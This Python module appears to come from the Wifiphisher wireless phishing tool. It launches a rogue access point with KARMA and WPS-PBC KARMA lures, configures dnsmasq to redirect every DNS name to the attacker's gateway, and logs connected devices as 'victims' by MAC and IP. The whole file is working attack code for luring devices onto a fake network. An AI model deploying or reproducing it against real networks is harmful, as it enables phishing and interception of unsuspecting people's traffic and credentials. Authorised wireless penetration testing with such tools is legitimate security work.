"""This module was made to fork the rogue access point."""

from __future__ import (absolute_import, division, print_function,
                        unicode_literals)

import os
import subprocess
import time
from subprocess import check_output

import roguehostapd.apctrl as apctrl
import roguehostapd.config.hostapdconfig as hostapdconfig
import wifiphisher.common.constants as constants
import wifiphisher.common.victim as victim


class AccessPoint(object):
    """This class forks the softAP."""

    # Instance will be stored here.
    __instance = None

    @staticmethod
    def get_instance():
        """Return the instance of the class or create new if none exists."""
        if AccessPoint.__instance is None:
            AccessPoint()
        return AccessPoint.__instance

    def __init__(self):
        # type: () -> None
        """Initialize the class."""
        if AccessPoint.__instance:
            raise Exception("Error: AccessPoint class is a singleton!")
        else:
            AccessPoint.__instance = self

        self.interface = ""
        self.internet_interface = ""
        self.channel = ""
        self.essid = ""
        self.presharedkey = ""
        self.force_hostapd = False
        # roguehostapd object
        self.hostapd_object = None
        self.deny_mac_addrs = []
        self.dns_conf_path = constants.DNS_CONF_PATH

    def start_dhcp_dns(self):
        # type: () -> None
        """Start the dhcp server."""
        config = ('no-resolv\n' 'interface=%s\n' 'dhcp-range=%s\n')

        with open(self.dns_conf_path, 'w') as dhcpconf:
            dhcpconf.write(config % (self.interface, constants.DHCP_LEASE))

        with open(self.dns_conf_path, 'a+') as dhcpconf:
            if self.internet_interface:
                dhcpconf.write("server=%s" % (constants.PUBLIC_DNS, ))
            else:
                dhcpconf.write("address=/google.com/172.217.5.78\n")
                dhcpconf.write("address=/clients3.google.com/172.217.11.174\n")
                dhcpconf.write("address=/#/%s " % (constants.NETWORK_GW_IP, ))
        # catch the exception if dnsmasq is not installed
        try:
            subprocess.Popen(
                ['dnsmasq', '-C', self.dns_conf_path],
                stdout=subprocess.PIPE,
                stderr=constants.DN)
        except OSError:
            print("[{}!{}] dnsmasq is not installed!".format(
                constants.R, constants.W))
            raise Exception

        subprocess.Popen(
            ['ifconfig', str(self.interface), 'mtu', '1400'],
            stdout=constants.DN,
            stderr=constants.DN)

        subprocess.Popen(
            [
                'ifconfig',
                str(self.interface), 'up', constants.NETWORK_GW_IP, 'netmask',
                constants.NETWORK_MASK
            ],
            stdout=constants.DN,
            stderr=constants.DN)
        # Give it some time to avoid "SIOCADDRT: Network is unreachable"
        time.sleep(1)
        # Make sure that we have set the network properly.
        proc = subprocess.check_output(['ifconfig', str(self.interface)])
        if constants.NETWORK_GW_IP not in proc.decode('utf-8'):
            return False

    def start(self, disable_karma=False):
        """Start the softAP."""
        # create the configuration for roguehostapd
        hostapd_config = {
            "ssid": self.essid,
            "interface": self.interface,
            "channel": self.channel,
            "deny_macs": self.deny_mac_addrs,
        }
        if self.presharedkey:
            hostapd_config['wpa2password'] = self.presharedkey
        self.hostapd_object = apctrl.Hostapd()
        if not self.force_hostapd:
            try:
                # Enable KARMA attack if needed
                if not disable_karma:
                    hostapd_config["karma_enable"] = 1
                # Enable WPSPBC KARMA attack
                hostapd_config["wpspbc"] = True
                hostapd_options = {
                    'mute': True,
                    'timestamp': False,
                    "eloop_term_disable": True
                }
                self.hostapd_object.start(hostapd_config, hostapd_options)
            except KeyboardInterrupt:
                raise Exception
            except BaseException:
                print(
                    "[{}!{}] Roguehostapd is not installed in the system! Please install"
                    " roguehostapd manually (https://github.com/wifiphisher/roguehostapd)"
                    " and rerun the script. Otherwise, you can run the tool with the"
                    " --force-hostapd option to use hostapd but please note that using"
                    " Wifiphisher with hostapd instead of roguehostapd will turn off many"
                    " significant features of the tool.".format(
                        constants.R, constants.W))
                # just raise exception when hostapd is not installed
                raise Exception
        else:
            # use the hostapd on the users' system
            self.hostapd_object.create_hostapd_conf_file(hostapd_config, {})
            try:
                self.hostapd_object = subprocess.Popen(
                    ['hostapd', hostapdconfig.ROGUEHOSTAPD_RUNTIME_CONFIGPATH],
                    stdout=constants.DN,
                    stderr=constants.DN)
            except OSError:
                print(
                    "[{}!{}] hostapd is not installed in the system! Please download it"
                    " using your favorite package manager (e.g. apt-get install hostapd) and "
                    "rerun the script.".format(constants.R, constants.W))
                # just raise exception when hostapd is not installed
                raise Exception

            time.sleep(2)
            if self.hostapd_object.poll() is not None:
                print("[{}!{}] hostapd failed to lunch!".format(
                    constants.R, constants.W))
                raise Exception

    def on_exit(self):
        # type: () -> None
        """Clean up the resoures when exits."""
        subprocess.call('pkill dnsmasq', shell=True)
        try:
            self.hostapd_object.stop()
        except BaseException:
            subprocess.call('pkill hostapd', shell=True)
            if os.path.isfile(hostapdconfig.ROGUEHOSTAPD_RUNTIME_CONFIGPATH):
                os.remove(hostapdconfig.ROGUEHOSTAPD_RUNTIME_CONFIGPATH)
            if os.path.isfile(hostapdconfig.ROGUEHOSTAPD_DENY_MACS_CONFIGPATH):
                os.remove(hostapdconfig.ROGUEHOSTAPD_DENY_MACS_CONFIGPATH)

        if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
            os.remove('/var/lib/misc/dnsmasq.leases')
        if os.path.isfile('/tmp/dhcpd.conf'):
            os.remove('/tmp/dhcpd.conf')
        # sleep 2 seconds to wait all the hostapd process is
        # killed
        time.sleep(2)

    def read_connected_victims_file(self):
        """Update the Victims dictionary by reading dnsmasq.leases file."""
        if (not os.path.isfile('/var/lib/misc/dnsmasq.leases')):
            return
        with open("/var/lib/misc/dnsmasq.leases", "r") as dnsmasq_leases:
            for line in dnsmasq_leases:
                line = line.split()
                if not line:
                    return
                mac_address = line[1].strip()
                ip_address = line[2].strip()
                # Get instance of victims dic
                victims_instance = victim.Victims.get_instance()
                if mac_address in victims_instance.victims_dic:
                    existing_victim = victims_instance.victims_dic[mac_address]
                    if ip_address == existing_victim.ip_address:
                        return
                    existing_victim.assign_ip_to_victim(mac_address, ip_address)
                else:
                    new_victim = victim.Victim(mac_address, ip_address)
                    victims_instance.add_to_victim_dic(new_victim)
                    new_victim.associate_victim_mac_to_vendor(mac_address)
